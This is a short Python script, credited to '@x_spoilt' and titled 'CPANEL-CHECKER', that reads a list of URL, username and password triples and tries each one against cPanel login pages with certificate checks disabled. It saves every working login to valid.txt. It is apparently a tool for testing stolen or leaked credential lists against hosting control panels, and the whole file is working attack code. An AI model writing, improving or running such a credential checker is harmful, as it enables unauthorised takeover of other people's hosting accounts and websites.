import asyncio
import aiohttp

def logo():
    print(">---------------------------------<")
    print("> CODED BY : @x_spoilt")
    print("> TOOL : CPANEL-CHECKER")
    print("> FILE STRUCTURE : URL|USER|PASS")
    print(">---------------------------------<")


async def puk(url, username, pwd):
    try:
        async with aiohttp.ClientSession() as session:
            login_url = f"{url}/login/?login_only=1"
            login_data = {'user': username, 'pass': pwd}

            async with session.post(login_url, data=login_data, allow_redirects=True, ssl=False,
                                    timeout=10) as response:
                data = await response.text()
                if "security_token" in data:
                    ok = f"""
            VALID -|URL : {url}
                   |USER : {username}
                   |PASS : {pwd}
            ----------------------------------
                    """
                    print(ok)
                    open("valid.txt", "a").write(f"{url}|{username}|{pwd}\n")

                else:
                    open("error.txt", "a").write(f"{url}|{username}|{pwd}\n")
    except Exception as e:
        print(f"> {str(e)}")


def main():
    logo()
    filein = input("> ENTER FILE : ")
    file = open(filein, "r").read().splitlines()
    for cpl in file:
        url, username, pwd = cpl.split("|")
        asyncio.run(puk(url, username, pwd))


if __name__ == "__main__":
    main()
